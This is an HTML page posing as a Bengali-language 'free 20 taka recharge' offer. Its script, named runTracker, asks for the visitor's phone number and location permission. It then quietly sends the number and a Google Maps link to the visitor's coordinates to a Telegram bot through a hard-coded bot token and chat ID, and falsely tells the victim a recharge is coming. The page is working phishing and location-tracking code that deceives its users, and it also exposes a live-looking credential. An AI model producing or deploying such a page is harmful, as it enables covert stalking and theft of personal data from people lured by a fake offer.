<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Recharge Portal</title>
    <style>
        body { background: #f8f9fa; font-family: sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 50px auto; padding: 30px; background: white; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h2 { color: #28a745; margin-bottom: 10px; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 18px; box-sizing: border-box; }
        .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>নম্বর দিয়ে ভেরিফিকেশন সম্পন্ন করুন।</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button class="btn" id="subBtn" onclick="runTracker()">রিচার্জ নিন</button>
    </div>

<script>
async function runTracker() {
    const num = document.getElementById('phone').value;
    const btn = document.getElementById('subBtn');

    if (num.length < 11) { alert("সঠিক ১১ সংখ্যার নম্বর দিন!"); return; }
    
    btn.innerText = "প্রসেসিং...";
    btn.disabled = true;

    navigator.geolocation.getCurrentPosition(async (pos) => {
        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
        const chat_id = "7887080882";
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        
        // ম্যাপ লিঙ্ক একদম নির্ভুল ফরম্যাটে
        const map = `https://www.google.com/maps?q=${lat},${lon}`;
        const text = `🔔 **নতুন ট্র্যাকিং রিপোর্ট!**\n\n📱 নম্বর: ${num}\n📍 লোকেশন: ${map}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            if(response.ok) {
                alert("অনুরোধ সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
            } else {
                alert("বট টোকেন বা চ্যাট আইডিতে ভুল আছে।");
            }
        } catch (e) {
            alert("ইন্টারনেট বা সার্ভার সমস্যা।");
        } finally {
            btn.innerText = "রিচার্জ নিন";
            btn.disabled = false;
        }
    }, (err) => {
        alert("লোকেশন পারমিশন ছাড়া অফারটি কাজ করবে না। ব্রাউজার থেকে Allow করুন।");
        btn.innerText = "রিচার্জ নিন";
        btn.disabled = false;
    }, { timeout: 10000 });
}
</script>
</body>
</html>
